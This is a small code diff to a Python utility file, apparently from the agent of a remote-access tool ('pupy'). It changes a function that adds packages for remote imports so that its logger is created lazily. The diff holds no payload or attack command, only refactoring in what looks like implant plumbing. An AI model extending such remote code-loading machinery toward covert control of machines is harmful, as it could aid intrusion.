@@ -24,15 +24,18 @@ if sys.version_info.major > 2:
 else:
     import cPickle as pickle
 
-import pupy.agent
 
-logger = pupy.agent.get_logger('utils')
+import pupy.agent
+logger = None
 
 
 def pupy_add_package(pkdic, compressed=False, name=None):
     ''' Update the modules dictionary to allow
         remote imports of new packages
     '''
+    global logger
+    if logger is None:
+        logger = pupy.agent.get_logger('utils')
     import pupy_modules
     import logging
     logger.setLevel(logging.DEBUG)
